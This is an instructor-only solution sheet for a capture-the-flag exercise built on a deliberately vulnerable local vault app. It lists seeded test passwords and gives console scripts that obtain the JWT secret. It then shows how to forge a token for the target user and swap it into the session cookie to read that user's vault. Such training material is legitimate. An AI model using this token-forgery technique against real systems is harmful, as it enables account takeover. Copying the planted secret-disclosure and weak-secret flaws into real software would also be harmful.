# CTF 2 — Solutions & Test Credentials

> **Instructors/markers only.** Do not distribute to participants.

---

## Test Credentials

These accounts are seeded into `server/data/users.json` and available immediately after startup.

| Username | Password | Notes |
|----------|----------|-------|
| `abcd12` | `password` | Regular user with demo vault entries |
| `test12` | `password` | Regular user |
| `flag12` | `password` | Target user — vault contains the flag |

Log in at `http://localhost:5173` with any of the above to verify the app is working.

---

## Flag Location

The flag is stored in `server/data/flags.json` under the key `flag12` and auto-inserted into `flag12`'s vault as a vault entry. It is visible at `/app/vault` when logged in as `flag12`.

---

## Solution Walkthrough

### Stage 1 — Obtain the JWT secret via Proof-of-Work

1. Log in as `abcd12` / `password`.
2. Navigate to `/app/challenge`.

**Option A — fully automatic (console only, no typing required)**

Open DevTools console (F12) and paste this. It fetches the nonce, finds the suffix, submits it, and prints the secret all in one go:

```js
(async()=>{
  async function sha256hex(s){const buf=new TextEncoder().encode(s);const h=await crypto.subtle.digest('SHA-256',buf);return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('')}
  const {nonce,difficulty} = await fetch('/api/challenge').then(r=>r.json());
  console.log('nonce:',nonce,'difficulty:',difficulty);
  let i=0;
  while(true){
    const suffix=i.toString(36);
    const h=await sha256hex(nonce+suffix);
    if(h.startsWith('0'.repeat(difficulty))){
      console.log('Found suffix:',suffix,'hash:',h);
      const res=await fetch('/api/challenge/solve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nonce,suffix}),credentials:'include'}).then(r=>r.json());
      console.log('JWT SECRET:',res.secret);
      break;
    }
    i++;
  }
})();
```

The secret prints as **`JWT SECRET: dev-secret-change-me`**. Copy it for Stage 2.

**Option B — use the challenge page submit box**

The suffix to type in is a short string (e.g. `1lme`) that makes `sha256(nonce + suffix)` start with `0000`. Since the nonce is random per page load, you must solve it for the specific nonce currently shown.

Steps:
1. On `/app/challenge`, **copy the nonce** shown under "Nonce:".
2. Open DevTools console (F12). Paste the **entire block** below — replace `PASTE_NONCE_HERE` with your copied nonce (keep the quotes):

```js
(async()=>{
  async function sha256hex(s){const buf=new TextEncoder().encode(s);const h=await crypto.subtle.digest('SHA-256',buf);return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('')}
  const nonce='PASTE_NONCE_HERE';
  let i=0;
  while(true){const suffix=i.toString(36);const h=await sha256hex(nonce+suffix);if(h.startsWith('0000')){console.log('TYPE THIS INTO THE BOX:',suffix);break;}i++;}
})();
```

> **Must paste the whole block at once.** Running `sha256(...)` alone will fail — the function only exists inside this script.

3. The console outputs one short word, e.g. `TYPE THIS INTO THE BOX: f5p`. That short string (`f5p`) is the suffix — **not** the long hex hash that follows it. Type only the short suffix into the input field.
4. Click **Submit** — the page shows `Solved! Secret: dev-secret-change-me`.

> Do not refresh the page between steps — each refresh fetches a new nonce and your suffix becomes invalid.

### Stage 2 — Forge a JWT and steal the flag

1. Using the secret from Stage 1, forge a JWT signed for `flag12`:

```js
// Node.js
const jwt = require('jsonwebtoken')
const token = jwt.sign({ sub: 'flag12' }, '<SECRET_FROM_STAGE_1>', { expiresIn: '7d' })
console.log(token)
```

Or use [jwt.io](https://jwt.io) — paste the secret, set payload `{ "sub": "flag12" }`.

2. In your browser DevTools → Application → Cookies → `localhost` — replace the `session` cookie value with the forged token.
3. Navigate to `/app/vault` — the `flag12` vault entry contains the flag.

---

## Vulnerabilities Exploited

| Vulnerability | Location | Description |
|---------------|----------|-------------|
| JWT secret disclosure | `GET /api/challenge/solve` | Server returns `JWT_SECRET` as the PoW reward |
| Weak JWT secret | `server/index.js` | Secret is short and predictable (`dev-secret-change-me`) |
| IDOR | `GET /api/vault` | Vault is scoped to the JWT `sub` claim — forging it allows accessing any user's vault |

---

## Reset

```bash
docker compose down -v && docker compose up --build
```

This wipes `server/data/` (users, vaults, flags) and reseeds from the baked-in data files.
